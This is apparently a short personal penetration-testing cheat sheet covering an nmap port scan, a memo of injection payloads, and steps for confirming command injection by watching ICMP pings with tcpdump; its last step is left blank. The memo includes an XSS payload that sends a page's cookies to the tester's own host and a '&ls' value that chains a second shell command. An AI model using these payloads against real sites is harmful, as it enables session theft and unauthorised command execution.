# Pentest procedure

My personal procedure and ticks for pentest

## Discovery

The goal here is to discover the machine

1. Port scan

   Using nmap: `nmap -sV -p- -vvv -o nmap.txt $ip`

## Injection

Here, a memo of the different possible injections:
* insert javascript code (ex: `<script>document.location='http://<yourip>/?cookie='+document.cookie</script>`)
* continue linux command with '&' (ex: `&ls`)

Before inserting payload, we want to check if the command injection work.

1. open tcpdump to read icmp requests: `sudo tcpdump -i any -A icmp`
2. check that it works: `ping -c 1 $ip`
3. be sure your firewall accept icmp requests
4.
